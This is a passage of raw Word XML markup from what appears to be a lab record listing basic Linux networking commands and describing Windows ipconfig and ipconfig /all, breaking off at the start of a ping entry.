          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="680A1AC0" w14:textId="77777777" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
            <w:pPr>
              <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:left="720"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004967CD">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
              </w:rPr>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007104CD" w:rsidRPr="004967CD" w14:paraId="271341D6" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3255BB85"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ip address show or ip a</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1E07AA0C"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Displays IP address configuration.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007104CD" w:rsidRPr="004967CD" w14:paraId="705EB4C7" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="28D1806A"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ip link show</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="08383BE7"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Displays network interfaces.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007104CD" w:rsidRPr="004967CD" w14:paraId="5E633617" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7C4A2868"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ip route show</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="43FD1032"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Displays the routing table.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007104CD" w:rsidRPr="004967CD" w14:paraId="163BB1BE" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1F1EE7B9"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ip neigh show</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7FAC761A"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Displays the ARP (neighbor) table.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007104CD" w:rsidRPr="004967CD" w14:paraId="6BC4DD61" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0B1E87E4"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ping &lt;hostname/IP&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2D4FDC58"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Checks network connectivity.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007104CD" w:rsidRPr="004967CD" w14:paraId="6B7E9E9D" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7A6DC207"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hostname</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5FB9870B"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Displays the host name.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007104CD" w:rsidRPr="004967CD" w14:paraId="29379721" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7397E345"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ss</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="24F6C02F"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Displays active network connections.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007104CD" w:rsidRPr="004967CD" w14:paraId="231E9EDD" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="54AD8E7A"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 xml:space="preserve">netstat </w:t>
            </w:r>
            <w:r w:rsidRPr="004967CD">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:i/>
                <w:iCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
              </w:rPr>
              <w:t>(if installed)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="213FAEB8"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Displays network statistics and connections.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007104CD" w:rsidRPr="004967CD" w14:paraId="16E826AE" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="68C14BD7"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 xml:space="preserve">ifconfig </w:t>
            </w:r>
            <w:r w:rsidRPr="004967CD">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:i/>
                <w:iCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
              </w:rPr>
              <w:t>(legacy command)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5A8762DA"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Displays network interface configuration (older command).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007104CD" w:rsidRPr="004967CD" w14:paraId="71C7D375" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6320A0C0"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traceroute &lt;hostname/IP&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="75C3C0C9"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Displays the packet route to the destination.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007104CD" w:rsidRPr="004967CD" w14:paraId="3436A388" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1A0813D6"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nslookup &lt;domain&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="42EDB49C" w14:textId="77777777" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
            <w:pPr>
              <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:left="720"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004967CD">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
              </w:rPr>
              <w:t>Retrieves DNS information for a domain.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="28CF0887" w14:textId="77777777" w:rsidR="00672390" w:rsidRDefault="00672390" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55E67B30" w14:textId="77777777" w:rsidR="0092609B" w:rsidRDefault="0092609B" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A5CAC40" w14:textId="64AFF062" w:rsidR="0092609B" w:rsidRDefault="004A33B5" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="0092609B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Windows Networking </w:t>
      </w:r>
      <w:r w:rsidR="006E7241">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Commands</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="654E6182" w14:textId="75A96C1E" w:rsidR="00A4576A" w:rsidRPr="00BD5B31" w:rsidRDefault="00A4576A" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BD5B31">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>1. ipconfig</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AFF942B" w14:textId="77777777" w:rsidR="00A4576A" w:rsidRPr="00BD5B31" w:rsidRDefault="00A4576A" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BD5B31">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>NAME:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD5B31">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00BD5B31">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ipconfig</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD5B31">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> - displays the IP configuration of the system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09E3E43B" w14:textId="77777777" w:rsidR="00A4576A" w:rsidRPr="00BD5B31" w:rsidRDefault="00A4576A" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BD5B31">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>SYNOPSIS:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD5B31">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00BD5B31">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ipconfig [OPTION]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06B75E2A" w14:textId="77777777" w:rsidR="00A4576A" w:rsidRPr="00BD5B31" w:rsidRDefault="00A4576A" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BD5B31">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DESCRIPTION:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD5B31">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays the IP address, subnet mask, default gateway, and other basic network configuration information.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43A4239C" w14:textId="77777777" w:rsidR="00A4576A" w:rsidRPr="00BD5B31" w:rsidRDefault="00A4576A" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BD5B31">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>OUTPUT:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD5B31">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays the network configuration of the system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10199376" w14:textId="724EF4B6" w:rsidR="004A33B5" w:rsidRDefault="00766A0B" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5A0ED62A" wp14:editId="75DC76C1">
            <wp:extent cx="5731510" cy="6545580"/>
            <wp:effectExtent l="0" t="0" r="2540" b="7620"/>
            <wp:docPr id="695104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6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="6545580"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B60DEAD" w14:textId="77777777" w:rsidR="00766A0B" w:rsidRDefault="00766A0B" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4108117E" w14:textId="77777777" w:rsidR="00766A0B" w:rsidRDefault="00766A0B" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CE29121" w14:textId="77777777" w:rsidR="00766A0B" w:rsidRDefault="00766A0B" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A5984C8" w14:textId="77777777" w:rsidR="00766A0B" w:rsidRDefault="00766A0B" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E6A7940" w14:textId="77777777" w:rsidR="00766A0B" w:rsidRDefault="00766A0B" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="349D8E85" w14:textId="77777777" w:rsidR="007671F8" w:rsidRPr="00BD5B31" w:rsidRDefault="007671F8" w:rsidP="007671F8">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BD5B31">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>2. ipconfig /all</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B71570A" w14:textId="77777777" w:rsidR="007671F8" w:rsidRPr="00BD5B31" w:rsidRDefault="007671F8" w:rsidP="007671F8">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BD5B31">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>NAME:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD5B31">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ipconfig /all - displays detailed network configuration.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6624E27D" w14:textId="77777777" w:rsidR="007671F8" w:rsidRPr="00BD5B31" w:rsidRDefault="007671F8" w:rsidP="007671F8">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BD5B31">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>SYNOPSIS:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD5B31">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ipconfig /all</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3011B6AB" w14:textId="77777777" w:rsidR="007671F8" w:rsidRPr="00BD5B31" w:rsidRDefault="007671F8" w:rsidP="007671F8">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BD5B31">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DESCRIPTION:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD5B31">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays detailed network information, including the IP address, MAC address, DNS servers, DHCP status, and other network adapter details.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32998F1F" w14:textId="77777777" w:rsidR="007671F8" w:rsidRDefault="007671F8" w:rsidP="007671F8">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BD5B31">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>OUTPUT:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD5B31">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays complete network configuration details.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FD93967" w14:textId="09B5B80F" w:rsidR="00766A0B" w:rsidRDefault="00EC6302" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1B62CCBA" wp14:editId="3854B4AB">
            <wp:extent cx="5731510" cy="6045200"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="179251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7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="6045200"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="08EBCF7E" w14:textId="77777777" w:rsidR="00EC6302" w:rsidRDefault="00EC6302" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="317D7BB7" w14:textId="77777777" w:rsidR="00EC6302" w:rsidRDefault="00EC6302" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33D5861B" w14:textId="77777777" w:rsidR="00EC6302" w:rsidRDefault="00EC6302" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="406E34E9" w14:textId="77777777" w:rsidR="00EC6302" w:rsidRDefault="00EC6302" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5296220B" w14:textId="77777777" w:rsidR="00EC6302" w:rsidRDefault="00EC6302" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="656F3F58" w14:textId="77777777" w:rsidR="00F45453" w:rsidRDefault="00F45453" w:rsidP="00B8536F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C8D8FEB" w14:textId="417FF88E" w:rsidR="00B8536F" w:rsidRPr="00406FE6" w:rsidRDefault="00B8536F" w:rsidP="00B8536F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00406FE6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>3. ping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD6E2B7" w14:textId="77777777" w:rsidR="00B8536F" w:rsidRPr="00406FE6" w:rsidRDefault="00B8536F" w:rsidP="00B8536F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
